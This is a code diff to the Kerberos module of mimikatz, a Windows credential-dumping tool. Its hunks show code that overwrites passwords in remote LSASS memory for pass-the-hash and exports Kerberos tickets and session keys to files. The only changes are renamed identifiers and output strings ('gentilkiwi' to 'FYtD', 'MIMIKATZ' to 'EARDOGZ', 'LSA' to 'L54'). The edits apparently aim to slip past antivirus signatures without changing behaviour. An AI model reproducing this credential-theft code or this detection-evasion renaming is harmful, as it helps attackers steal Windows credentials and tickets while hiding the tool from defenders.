@@ -1,6 +1,6 @@
-/*	Benjamin DELPY `gentilkiwi`
-	https://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
+/*	Benjamin DELPY `FYtD`
+	https://blog.FYtD.com
+	benjamin@FYtD.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_kerberos.h"
@@ -551,7 +551,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 
 							if(pthData->isReplaceOk)
 							{
-								kprintf(L"\n   \\_ *Password replace @ %p (%u) -> ", aRemotePasswdMemory.address, (DWORD) kerbHelper[KerbOffsetIndex].passwordEraseSize);
+								kprintf(L"\n   \\_ * Password Replace - %p(%u) -> ", aRemotePasswdMemory.address, (DWORD) kerbHelper[KerbOffsetIndex].passwordEraseSize);
 								if(aLocalPasswdMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].passwordEraseSize))
 								{
 									if(pthData->isReplaceOk = kull_m_memory_copy(&aRemotePasswdMemory, &aLocalPasswdMemory, kerbHelper[KerbOffsetIndex].passwordEraseSize))
@@ -636,7 +636,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 
 						if(!isNormalSessionKey)
 						{
-							kprintf(L"\n\t   LSA Session Key   : 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));
+							kprintf(L"\n\t   L54 Session Key   @ 0x%08x - %s", pKiwiTicket->KeyType, kuhl_m_kerberos_ticket_etype(pKiwiTicket->KeyType));
 							if(pKiwiTicket->Key.Length <= (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("KerberosKey") - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
 							{
 								if(kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) pKiwiTicket->Key.Value, &lsaIsoKey.Value, &lsaIsoKey.Length))
@@ -652,7 +652,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 						}
 
 						if(isFile)
-							if(filename = kuhl_m_sekurlsa_kerberos_generateFileName(pData->LogonId, grp, nbTickets, pKiwiTicket, MIMIKATZ_KERBEROS_EXT))
+							if(filename = kuhl_m_sekurlsa_kerberos_generateFileName(pData->LogonId, grp, nbTickets, pKiwiTicket, EARDOGZ_KERBEROS_EXT))
 							{
 								if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(pKiwiTicket, FALSE))
 								{
@@ -685,7 +685,7 @@ wchar_t * kuhl_m_sekurlsa_kerberos_generateFileName(PLUID LogonId, const DWORD g
 	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
 	{
 		if(isLong)
-			isLong = swprintf_s(buffer, charCount, L"[%x;%x]-%1u-%u-%08x-%wZ@%wZ-%wZ.%s", LogonId->HighPart, LogonId->LowPart, grp, index, ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
+			isLong = swprintf_s(buffer, charCount, L"@[%x;%x]@-%1u-%u-%08x-%wZ@%wZ-%wZ.%s@", LogonId->HighPart, LogonId->LowPart, grp, index, ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
 		else
 			isLong = swprintf_s(buffer, charCount, L"[%x;%x]-%1u-%u-%08x.%s", LogonId->HighPart, LogonId->LowPart, grp, index, ticket->TicketFlags, ext) > 0;
 		
